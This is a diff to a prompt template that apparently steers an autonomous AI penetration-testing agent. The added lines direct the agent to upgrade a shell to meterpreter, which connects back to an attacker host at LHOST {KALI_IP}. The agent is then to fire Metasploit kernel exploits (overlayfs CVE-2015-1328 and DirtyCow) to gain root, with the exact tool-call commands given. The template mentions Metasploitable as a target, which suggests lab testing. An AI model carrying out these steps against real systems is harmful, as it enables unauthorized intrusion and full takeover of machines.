@@ -235,6 +235,17 @@ You receive:
 Use verbose queries (e.g., "Linux privilege escalation via sudo misconfiguration NOPASSWD nmap GTFObins").
 You may make up to {MAX_PLANNER_TOOL_CALLS} queries.
 
+**IMPORTANT — command_shell vs meterpreter (this unlocks the kernel path):**
+`local_exploit_suggester` and most MSF local kernel-exploits require a
+METERPRETER session. If the current session is a command_shell, the FIRST plan
+step should UPGRADE it: `sessions -u <session_id>` (or `use
+post/multi/manage/shell_to_meterpreter; set SESSION <id>; set LHOST {KALI_IP};
+run`). Then run the suggester and fire the suggested kernel module against the
+NEW meterpreter session id. On an OLD kernel (3.x — common on legacy targets like
+Metasploitable), the **kernel exploit is often the ONLY way to root** when sudo/
+SUID/cron don't apply, so try it EARLY: `exploit/linux/local/overlayfs_priv_esc`
+(CVE-2015-1328) and `exploit/linux/local/cve_2016_5195_dirtycow` (DirtyCow).
+
 **Technique priority (based on enumeration results):**
 
 0. **local_exploit_suggester hits** — if the enumeration results contain
@@ -294,6 +305,12 @@ Do NOT continue executing plan steps against a dead session.
 3. After the escalation attempt, ALWAYS verify with `tool_session_command(session_id, "whoami")` and `tool_session_command(session_id, "id")`
 4. If `whoami` returns `root` or `id` shows `uid=0`, the escalation SUCCEEDED
 5. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands
+6. **MSF local/kernel exploits** (via `tool_metasploit_rpc`): these need a
+   meterpreter session. If your session is a command_shell, FIRST upgrade it —
+   `tool_metasploit_rpc("sessions -u <session_id>")` — note the new meterpreter
+   session id, then run e.g.
+   `tool_metasploit_rpc("use exploit/linux/local/overlayfs_priv_esc; set SESSION <mid>; set LHOST {KALI_IP}; run")`.
+   `local_exploit_suggester` also needs meterpreter, so upgrade before running it.
 
 **When done, provide a text summary:**
 - Did `whoami` return `root`?
